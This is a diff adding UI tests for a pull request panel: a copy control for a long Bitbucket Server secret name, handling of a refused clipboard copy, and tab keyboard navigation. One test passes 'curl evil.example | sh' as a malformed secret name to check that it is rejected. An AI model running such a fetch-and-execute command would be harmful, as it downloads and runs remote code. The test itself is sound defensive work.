@@ -564,6 +564,100 @@ describe('PullRequestPanel', () => {
     expect(alert).toHaveTextContent('Ask the agent')
   })
 
+  it('sets the secret name a setup error ships apart, with a copy control beside it', async () => {
+    // With two or more Bitbucket Server hosts the name is a per-host one past 60
+    // characters; the gateway ships it as its own field, so it is copied whole
+    // instead of selected by hand out of the wrapped sentence.
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    const writeText = vi.fn().mockResolvedValue(undefined)
+    const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
+    try {
+      mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+        error: `Bitbucket Server at bitbucket.example.test needs an HTTP access token with read access. Store it in Settings > Secrets as ${name}.`,
+        code: 'provider_error',
+        secretName: name,
+      }))
+      renderPanel()
+      const alert = await screen.findByRole('alert')
+      expect(alert).toHaveTextContent('Could not load this pull request')
+      // Shown whole: no height cap that would turn the sentence into a scroll
+      // area the name block squeezes.
+      expect(alert.className).not.toContain('max-h-64')
+      // Uncapped, so the panel scrolls instead: on a short pane a long name
+      // makes the notice taller than the panel, and its top and the Retry
+      // button must stay reachable rather than being centred out of view.
+      const scroller = screen.getByTestId('pull-request-panel-load-error-scroller')
+      expect(scroller).toHaveClass('min-h-0', 'overflow-y-auto')
+      expect(scroller).not.toHaveClass('items-center')
+      expect(scroller).toContainElement(alert)
+      expect(within(scroller).getByRole('button', { name: 'Retry' })).toBeInTheDocument()
+      const block = within(alert).getByTestId('secret-name-copy')
+      expect(block).toHaveTextContent('Store the token under this name in Settings > Secrets')
+      expect(block.querySelector('code')?.textContent).toBe(name)
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      await waitFor(() => expect(writeText).toHaveBeenCalledWith(name))
+      const copiedButton = await within(block).findByRole('button', { name: 'Copied' })
+      // Both labels stay in the button, the hidden one taking its room, so the
+      // button keeps its width and the name beside it does not re-wrap.
+      const labels = Array.from(copiedButton.querySelectorAll('.grid > span'))
+      expect(labels.map(l => [l.textContent, l.getAttribute('aria-hidden')]))
+        .toEqual([['Copy name', 'true'], ['Copied', null]])
+    } finally {
+      if (originalClipboard) Object.defineProperty(navigator, 'clipboard', originalClipboard)
+    }
+  })
+
+  it('says a refused copy failed and how to get the name, and a later copy clears it', async () => {
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    const writeText = vi.fn().mockRejectedValue(new Error('denied'))
+    const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
+    const originalExec = document.execCommand
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
+    // The legacy fallback refuses too, so the copy genuinely fails.
+    document.execCommand = vi.fn(() => false)
+    try {
+      mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+        error: `Store it in Settings > Secrets as ${name}.`,
+        code: 'provider_error',
+        secretName: name,
+      }))
+      renderPanel()
+      const block = within(await screen.findByRole('alert')).getByTestId('secret-name-copy')
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      const failure = await within(block).findByTestId('secret-name-copy-error')
+      expect(failure).toHaveTextContent('Copy failed. Select the name above and copy it yourself.')
+      // Nothing on this read-only panel can be lost, so the hand-off is offered,
+      // named for the copy so it does not repeat the load error's own link.
+      expect(within(failure).getByText('Ask the agent about the failed copy')).toBeInTheDocument()
+      expect(within(failure).queryByText('Ask the agent')).toBeNull()
+      // The hand-off has a line of its own under the message, never a slot in
+      // the message's row, where a narrow panel crushed the message beside it.
+      const handoff = within(failure).getByRole('button', { name: /Ask the agent about the failed copy/ })
+      expect(handoff.parentElement).not.toBe(failure)
+      expect(handoff.parentElement?.textContent).toBe('Ask the agent about the failed copy')
+      expect(within(block).queryByRole('button', { name: 'Copied' })).toBeNull()
+      writeText.mockResolvedValue(undefined)
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      expect(await within(block).findByRole('button', { name: 'Copied' })).toBeInTheDocument()
+      expect(within(block).queryByTestId('secret-name-copy-error')).toBeNull()
+    } finally {
+      document.execCommand = originalExec
+      if (originalClipboard) Object.defineProperty(navigator, 'clipboard', originalClipboard)
+    }
+  })
+
+  it('offers no secret name to copy when the error carries none, or a malformed one', async () => {
+    mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+      error: 'Store it in Settings > Secrets as BITBUCKET_SERVER_TOKEN.',
+      code: 'provider_error',
+      secretName: 'curl evil.example | sh',
+    }))
+    renderPanel()
+    const alert = await screen.findByRole('alert')
+    expect(within(alert).queryByTestId('secret-name-copy')).toBeNull()
+  })
+
   it('preserves trusted-install guidance when the local CLI is unavailable', async () => {
     mockApi.pullRequestSource.mockRejectedValueOnce(
       new Error('{"error":"The local GitHub CLI (gh) was not found in a trusted system location. Install a root-owned `gh` at `/usr/local/libexec/kirocrew/gh`, run `gh auth login`, then retry."}'),
@@ -1671,5 +1765,56 @@ describe('PullRequestPanel with a review that has several revisions', () => {
     expect(mockApi.pullRequestSource).toHaveBeenCalledWith(REV_2, false)
     expect(mockApi.pullRequestSource).not.toHaveBeenCalledWith(REV_1, expect.anything())
     expect(onReconcile).toHaveBeenCalledWith(REV_2)
+  })
+})
+
+// Both rails follow the shared Tablist keyboard model: one Tab stop per rail
+// (the selected tab), and the arrow keys, Home and End move between tabs.
+describe('PullRequestPanel tab keyboard', () => {
+  const tabStops = (tabs: HTMLElement[]) => tabs.filter(t => t.getAttribute('tabindex') === '0')
+
+  it('keeps the section rail to one Tab stop and moves with the arrows', async () => {
+    renderPanel()
+    await screen.findByText('Add source tabs')
+    const rail = screen.getByRole('tablist', { name: 'Pull request sections' })
+    const tabs = within(rail).getAllByRole('tab')
+    expect(tabs.length).toBeGreaterThan(2)
+    expect(tabStops(tabs)).toEqual([tabs[0]])
+
+    fireEvent.keyDown(tabs[0], { key: 'ArrowRight' })
+    expect(tabs[1]).toHaveFocus()
+    expect(tabs[1]).toHaveAttribute('aria-selected', 'true')
+    expect(tabStops(within(rail).getAllByRole('tab'))).toEqual([tabs[1]])
+
+    fireEvent.keyDown(tabs[1], { key: 'Home' })
+    expect(tabs[0]).toHaveFocus()
+    fireEvent.keyDown(tabs[0], { key: 'ArrowLeft' })
+    expect(tabs[tabs.length - 1]).toHaveFocus()
+  })
+
+  it('keeps the source strip to one Tab stop and selects with the arrows', async () => {
+    const onSelect = vi.fn()
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gitlab.url, provider: 'gitlab', number: 7, repo: 'service' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={onSelect}
+          onAddToChat={vi.fn()}
+        />
+      </QueryClientProvider>,
+    )
+    await screen.findByText('Add source tabs')
+    const strip = screen.getByRole('tablist', { name: 'Pull requests' })
+    const tabs = within(strip).getAllByRole('tab')
+    expect(tabStops(tabs)).toEqual([tabs[0]])
+
+    fireEvent.keyDown(tabs[0], { key: 'End' })
+    expect(onSelect).toHaveBeenCalledWith(gitlab.url)
+    expect(tabs[1]).toHaveFocus()
   })
 })
